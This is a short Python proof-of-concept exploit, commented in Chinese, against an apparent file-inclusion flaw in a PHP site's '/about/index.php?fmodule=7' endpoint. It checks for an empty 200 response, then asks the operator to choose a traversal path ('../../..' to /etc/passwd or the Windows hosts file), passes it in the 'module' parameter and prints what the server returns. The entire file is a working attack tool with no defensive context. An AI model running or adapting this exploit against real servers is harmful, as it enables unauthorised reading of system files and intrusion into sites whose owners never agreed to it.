import requests
import sys


url = sys.argv[1]          # 输入网址
fullurl = url+"/about/index.php?fmodule=7"  # 默认完整网址（注入点）

res = requests.get(url = fullurl)   # 获取返回网址

if(res.status_code == 200) and (not res.text):  # 判定是否有返回200 并且网页为空
    f = [
        '../../../../../../../../etc/passwd',   # linux系统查看的文件
        '../../../../../../../../windows/system32/drivers/etc/hosts' # windows
    ]
    flag = input("漏洞存在，继续输入y，停止输入n")

    if flag =="n":      # 判断输入n结束
        print("Done")
        exit()
    
    choose = input("请输入你要查看的文件:\n1> {}\n2> {}\n".format(f[0],f[1]))
    if choose == "1":
        path = f[0]
    if choose == "2":
        path = f[1]
    
    fullurl = url+"/about/index.php?fmodule=7&module={}".format(path)
    res = requests.get(url = fullurl)   # 将完整url传入res
    print(res.text)